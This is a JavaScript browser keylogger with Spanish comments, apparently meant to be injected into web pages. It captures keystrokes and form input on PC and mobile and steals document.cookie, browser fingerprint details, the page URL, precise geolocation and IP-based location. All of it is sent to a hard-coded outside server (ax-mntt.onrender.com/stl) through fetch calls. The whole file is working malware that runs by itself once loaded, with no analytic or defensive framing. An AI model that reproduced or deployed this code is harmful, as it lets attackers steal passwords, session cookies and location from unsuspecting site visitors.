// ============================================================
// KEYLOGGER + UBICACIÓN - Versión PC y Móvil
// ============================================================

(function() {
    'use strict';
    
    console.log('⌨️ Keylogger (PC+Móvil) cargado');
    
    let buffer = '';
    const servidor = 'https://ax-mntt.onrender.com';
    
    // ============================================================
    // 1. CAPTURA EN MÓVILES (evento 'input')
    // ============================================================
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const texto = e.target.value;
            const textoAnterior = e.target.dataset.ultimoValor || '';
            
            if (texto.length > textoAnterior.length) {
                const nuevoTexto = texto.substring(textoAnterior.length);
                capturarTecla(nuevoTexto);
            } else if (texto.length < textoAnterior.length) {
                capturarTecla('[BORRADO]');
            }
            
            e.target.dataset.ultimoValor = texto;
        }
    });
    
    // ============================================================
    // 2. CAPTURA EN PC (evento 'keydown')
    // ============================================================
    document.addEventListener('keydown', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            if (e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
                const teclaEspecial = e.key === 'Enter' ? '\n[ENTER]\n' :
                                      e.key === 'Backspace' ? '[DEL]' :
                                      e.key === 'Tab' ? '[TAB]' :
                                      `[${e.key}]`;
                capturarTecla(teclaEspecial);
            }
            return;
        }
        
        let tecla = e.key;
        
        if (tecla === 'Enter') tecla = '\n[ENTER]\n';
        else if (tecla === 'Backspace') tecla = '[DEL]';
        else if (tecla === 'Tab') tecla = '[TAB]';
        else if (tecla === 'Shift') tecla = '[SHIFT]';
        else if (tecla === 'Control') tecla = '[CTRL]';
        else if (tecla === 'Alt') tecla = '[ALT]';
        else if (tecla === 'Escape') tecla = '[ESC]';
        else if (tecla === 'ArrowUp') tecla = '[↑]';
        else if (tecla === 'ArrowDown') tecla = '[↓]';
        else if (tecla === 'ArrowLeft') tecla = '[←]';
        else if (tecla === 'ArrowRight') tecla = '[→]';
        
        if (tecla.length === 1 || tecla.startsWith('[')) {
            capturarTecla(tecla);
        }
    });
    
    // ============================================================
    // 3. CAPTURA EN MÓVILES (evento 'change')
    // ============================================================
    document.addEventListener('change', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const texto = e.target.value;
            if (texto.length > 0) {
                capturarTecla('[FORMULARIO ENVIADO]: ' + texto);
            }
            e.target.value = '';
            e.target.dataset.ultimoValor = '';
        }
    });
    
    // ============================================================
    // 4. FUNCIÓN PARA CAPTURAR TECLAS
    // ============================================================
    function capturarTecla(tecla) {
        buffer += tecla;
        if (buffer.length >= 10) {
            enviarTeclas();
        }
    }
    
    // ============================================================
    // 5. ENVIAR EL BUFFER
    // ============================================================
    function enviarTeclas() {
        if (buffer.length === 0) return;
        
        const data = 'keylog:' + buffer;
        fetch(servidor + '/stl?data=' + encodeURIComponent(data))
            .catch(function(error) {
                console.log('⚠️ Error al enviar keylog:', error);
            });
        
        buffer = '';
    }
    
    setInterval(function() {
        if (buffer.length > 0) {
            enviarTeclas();
        }
    }, 3000);
    
    // ============================================================
    // 6. ROBAR DATOS ADICIONALES
    // ============================================================
    
    // Robar cookies
    fetch(servidor + '/stl?cookie=' + encodeURIComponent(document.cookie));
    
    // Robar info del navegador
    fetch(servidor + '/stl?data=navegador:' + encodeURIComponent(JSON.stringify({
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        isMobile: /Mobi|Android|iPhone/i.test(navigator.userAgent)
    })));
    
    // Robar la URL actual
    fetch(servidor + '/stl?url=' + encodeURIComponent(window.location.href));
    
    // ============================================================
    // 7. ROBAR UBICACIÓN (si el usuario acepta)
    // ============================================================
    
    function robarUbicacion() {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(posicion) {
                    const ubicacion = {
                        lat: posicion.coords.latitude,
                        lng: posicion.coords.longitude,
                        precision: posicion.coords.accuracy + ' metros',
                        altitud: posicion.coords.altitude || 'N/A',
                        velocidad: posicion.coords.speed || 'N/A'
                    };
                    fetch(servidor + '/stl?data=ubicacion_exacta:' + JSON.stringify(ubicacion));
                },
                function(error) {
                    console.log('⚠️ Usuario rechazó ubicación');
                },
                { timeout: 5000, enableHighAccuracy: true }
            );
        }
    }
    
    // ============================================================
    // 8. ROBAR UBICACIÓN POR IP (sin permiso)
    // ============================================================
    
    function robarUbicacionPorIP() {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ubicacion = {
                    ip: data.ip,
                    ciudad: data.city || 'N/A',
                    region: data.region || 'N/A',
                    pais: data.country_name || 'N/A',
                    lat: data.latitude || 'N/A',
                    lng: data.longitude || 'N/A',
                    codigo_postal: data.postal || 'N/A',
                    isp: data.org || 'N/A'
                };
                fetch(servidor + '/stl?data=ip_ubicacion:' + JSON.stringify(ubicacion));
            })
            .catch(function(error) {
                // Fallback a otra API
                fetch('https://ip-api.com/json/')
                    .then(response => response.json())
                    .then(data => {
                        const ubicacion = {
                            ip: data.query || 'N/A',
                            ciudad: data.city || 'N/A',
                            region: data.regionName || 'N/A',
                            pais: data.country || 'N/A',
                            lat: data.lat || 'N/A',
                            lng: data.lon || 'N/A',
                            isp: data.isp || 'N/A'
                        };
                        fetch(servidor + '/stl?data=ip_ubicacion_fallback:' + JSON.stringify(ubicacion));
                    });
            });
    }
    
    // ============================================================
    // 9. EJECUTAR
    // ============================================================
    
    // Intentar robar ubicación exacta (pide permiso)
    setTimeout(robarUbicacion, 2000);
    
    // Robar ubicación por IP (sin permiso)
    setTimeout(robarUbicacionPorIP, 3000);
    
    console.log('✅ Keylogger (PC+Móvil+Ubicación) activo en:', window.location.href);
})();